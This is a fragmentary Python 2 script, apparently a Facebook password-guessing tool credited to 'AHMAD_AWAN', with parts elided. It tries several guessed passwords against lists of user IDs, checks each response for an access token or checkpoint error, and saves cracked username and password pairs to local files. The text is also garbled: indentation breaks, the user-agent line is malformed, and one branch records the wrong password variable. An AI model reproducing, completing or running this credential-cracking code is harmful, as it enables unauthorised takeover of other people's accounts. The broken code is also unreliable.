...
# Original written By AHMAD_AWAN
...
br.addheaders = [('Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36]')]
...
\x1b[1;96m\033[1;96mAuthor   :            AHMAD_AWAN
\x1b[1;96m\033[1;96mFacebook :         AJAWAN
\x1b[1;96m\033[1;96mGitHub   :             ahmad77412
\x1b[1;96m\033[1;96mVersion  :              without
...
def action():
    ...
    os.system('clear')
    print logo
    jalan ('\x1b[1;97mUse without internet sim.')
    print(47*'-')
    xxx = str(len(id))
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [AJ_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [AJ_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [AJ_Temp_Lock] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [AJ_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [AJ_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [AJ_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                       ...
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [AJ_Temp_Lock]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [AJ_CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
